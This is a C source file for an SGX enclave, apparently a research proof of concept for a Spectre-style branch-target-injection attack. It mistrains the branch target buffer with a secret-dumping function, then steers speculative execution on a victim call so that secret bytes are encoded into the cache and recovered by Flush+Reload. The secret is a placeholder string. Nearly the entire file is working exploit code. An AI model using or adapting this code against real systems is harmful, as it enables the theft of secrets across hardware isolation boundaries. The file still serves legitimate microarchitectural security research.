#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
#define SECRET "INACCESSIBLESECRET"

int idx;

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

char * create_secret() {
    // allocate secret
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        enclave_printf("allocation of secret failed\n");
    }
    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        enclave_printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}


#ifdef TESTING

char leaked[sizeof(SECRET)];

uint64_t not_ocall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET) - 1] = 0;

    flush_shared_memory();

    return (uint64_t)mem;
}

void not_ocall_encode(char c){
    cache_encode(c);
}

int not_ocall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}

#endif


void dump_secret(char* data) {
    char c = data[idx];

#ifdef TESTING
    not_ocall_encode(c);
#else
    ocall_encode(c);
#endif
}

void dummy(char* data) {
    return;
}

void speculate(void* func, char* data) {
  uint64_t c = 2147476866;
  uint64_t a = 1792388078;
  uint64_t d = 1983325987;
  int64_t offset = 64 * 63 * 64;
  int64_t val1 = 64;
  int64_t val2 = 63;
  int64_t validx = 0;
  int64_t vals[1];
  vals[0] = 64;
  mfence();
  flush(&func);
  flush(&val1);
  flush(&val2);

  flush(&vals);
  flush(&validx);

  flush(&a);
  flush(&d);
  flush(&c);
  asm volatile (
      // Registers already preloaded via constraints
      "div %%ecx\n\t"
      "div %%ecx\n\t"
      "div %%ecx\n\t"
      "div %%ecx\n\t"
      "div %%ecx\n\t"
      "div %%ecx\n\t"
      "sub $512, %%rdx\n\t"
      "add %%rdx, %[target]\n\t"
      :
      : [target] "r" (func),
        "a" (a),
        "c" (c),
        "d" (d)
      : "memory"
  );

  offset /= val2;
  offset /= val1;
  offset /= vals[validx];
  offset -= 1;
  func += offset;
  ((void (*)(char*))func)(data);
}

void ecall_main(){
#ifdef TESTING
    uint64_t val = not_ocall_init_attack();
#else
    uint64_t val;    
    ocall_init_attack(&val);
#endif
    mem = (char*)val;

    char* secret_data = create_secret(); 
    char* public_data = create_public();

#ifdef DEBUG_PRINT
    enclave_printf("Public %p, Secret %p\n", public_data, secret_data);
#endif

    void (*attacker)(char*);
    void (*victim)(char*);
    attacker = dump_secret;
    victim = dummy;

    flush_shared_memory();
    mfence();

    idx = 0;  
    int c = 0;
    int score = 0;
#ifdef TESTING
    #define MAXITER 100
#else
    #define MAXITER 1000
#endif

    while (1 && c != MAXITER) {
        c++;
        nospec();

        // Mistrain the BTB for Fish
        for(int j = 0; j < 8; j++) {
          speculate((void*)attacker, public_data);
        }
        // Flush our shared memory
        flush_shared_memory();
        mfence();
        nospec();

        // Leak bird secret
        speculate((void*)victim, secret_data);
        
        mfence();

        // Recover data from covert channel
        int res = 0;
#ifdef TESTING
        res = not_ocall_cache_decode(idx);
#else
        ocall_cache_decode(&res, idx);
#endif
        if (res){
            score++;
        }

        idx = (idx + 1) % (sizeof(SECRET) - 1);
    }

    enclave_printf("%d, %d", c, score);
    if (score > 0){
        enclave_printf(" <--\n");
    }else{
        enclave_printf("\n");
    }
}



